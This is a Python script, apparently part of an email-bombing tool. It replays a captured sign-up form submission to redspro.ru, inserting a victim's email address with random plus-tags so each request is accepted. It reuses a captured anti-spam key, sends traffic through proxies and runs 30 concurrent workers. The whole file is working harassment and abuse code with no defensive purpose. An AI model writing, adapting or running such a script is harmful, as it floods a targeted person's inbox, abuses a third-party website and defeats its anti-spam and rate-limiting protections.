from os.path import basename

import requests

import module
from module import Spam

cookies = {
    '_ga': 'GA1.1.118417749.1676292626',
    '_ga_40H3MVS40R': 'GS1.1.1676292626.1.1.1676293054.0.0.0',
}

headers = {
    'authority': 'redspro.ru',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary93HlAf6AqmoDmP5g',
    # 'cookie': '_ga=GA1.1.118417749.1676292626; _ga_40H3MVS40R=GS1.1.1676292626.1.1.1676293054.0.0.0',
    'origin': 'https://redspro.ru',
    'referer': 'https://redspro.ru/membership-join/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_1.4"\r\n\r\ntest\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_3"\r\n\r\n\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_4"\r\n\r\nN0O60lk8DGhvcFD34\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_4_2"\r\n\r\nN0O60lk8DGhvcFD34\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_4_strength"\r\n\r\nstrong\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_5.1"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_5.2"\r\n\r\nЯ согласен с <a href="/privacy-policy-reds/">политикой обработки персональных данных</a>.\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_5.3"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_6"\r\n\r\n\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="is_submit_1"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n63ea33a380bc1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="state_1"\r\n\r\nWyJ7XCI1LjFcIjpcImFlNmU3YWMwMjU0YmIwNmU1ODk4ZTIyZWNkYjk2ZGFkXCIsXCI1LjJcIjpcIjM4NTA0YjZkOTYwMjJjYWZjODk0NDk4M2JmZmYyNjg5XCIsXCI1LjNcIjpcImFlNmU3YWMwMjU0YmIwNmU1ODk4ZTIyZWNkYjk2ZGFkXCJ9IiwiMDgyMDc4MWU2ZDRmOTJiMjEwNjZmYTE2Mjg3N2UwNzEiXQ==\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_target_page_number_1"\r\n\r\n0\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_source_page_number_1"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gf_zero_spam_key"\r\n\r\np6yXdMTFTtRqPKNC8xOzIJNwlARc2yIqBXNsbN0ejEgV6KDfWkSWL5yoEDYj8GsQ\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g--\r\n'
        target = target.replace('@', f'+{module.generate_text()}@')
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post('https://redspro.ru/membership-join/', cookies=cookies, headers=headers,
                                 data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Спасибо')
    res = spam.send_post()
    if res:
        spam.run_concurrently(30)


if __name__ == '__main__':
    main()
